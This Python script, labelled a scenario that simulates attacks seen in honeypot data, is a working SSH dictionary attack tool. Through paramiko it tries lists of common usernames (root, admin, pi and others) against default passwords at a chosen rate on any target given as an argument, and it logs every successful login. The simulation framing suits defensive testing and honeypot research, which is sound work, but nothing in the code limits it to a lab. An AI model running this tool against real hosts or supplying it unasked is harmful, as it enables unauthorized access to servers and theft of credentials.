"""
Scenario 5: SSH Dictionary Attack Simulation

Enumerates common usernames and tries top passwords for each.
Mimics real-world scanner behavior observed in the honeypot data.

Usage:
    python dictionary_attack.py --target 192.168.1.100 --rate 8
"""

import argparse
import time
import logging
from datetime import datetime

try:
    import paramiko
except ImportError:
    import sys
    print("Install paramiko: pip install paramiko")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# Common usernames found in honeypot data
USERNAMES = [
    'root', 'admin', 'ubuntu', 'test', 'user', 'oracle', 'postgres',
    'mysql', 'ftp', 'www', 'deploy', 'jenkins', 'git', 'ansible',
    'vagrant', 'docker', 'hadoop', 'redis', 'mongodb', 'elastic',
    'tomcat', 'nginx', 'apache', 'www-data', 'backup', 'operator',
    'guest', 'support', 'dev', 'student', 'pi', 'daemon',
    'moodle', 'dell', 'orangepi', 'yyj',  # From actual honeypot data
]

# Top passwords per username
TOP_PASSWORDS = ['password', '123456', 'admin', 'root', 'toor', 'changeme']


def run_dictionary_attack(
    target: str,
    port: int = 22,
    rate: float = 8,
    passwords_per_user: int = 6,
    max_users: int = 20,
):
    """Run dictionary attack simulation."""
    delay = 1.0 / rate
    users = USERNAMES[:max_users]
    total = len(users) * passwords_per_user

    logger.info(f"=== Dictionary Attack Simulation ===")
    logger.info(f"Target: {target}:{port}")
    logger.info(f"Usernames: {len(users)}")
    logger.info(f"Passwords/user: {passwords_per_user}")
    logger.info(f"Total attempts: {total}")
    logger.info(f"Rate: {rate} attempts/sec")
    logger.info(f"Starting at: {datetime.now().isoformat()}")
    logger.info(f"{'='*50}")

    attempt = 0
    for username in users:
        logger.info(f"\n--- Enumerating: {username} ---")

        for password in TOP_PASSWORDS[:passwords_per_user]:
            attempt += 1
            logger.info(f"[{attempt}/{total}] {username}:{password}")

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(
                    hostname=target, port=port,
                    username=username, password=password,
                    timeout=3, look_for_keys=False, allow_agent=False,
                )
                logger.warning(f"SUCCESS! {username}:{password}")
                client.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                logger.debug(f"Error: {e}")
            finally:
                client.close()

            time.sleep(delay)

    logger.info(f"\nDictionary attack completed. {attempt} attempts.")
    logger.info(f"Finished at: {datetime.now().isoformat()}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Dictionary Attack Simulation')
    parser.add_argument('--target', required=True)
    parser.add_argument('--port', type=int, default=22)
    parser.add_argument('--rate', type=float, default=8)
    parser.add_argument('--passwords-per-user', type=int, default=6)
    parser.add_argument('--max-users', type=int, default=20)
    args = parser.parse_args()

    run_dictionary_attack(
        target=args.target, port=args.port, rate=args.rate,
        passwords_per_user=args.passwords_per_user, max_users=args.max_users,
    )
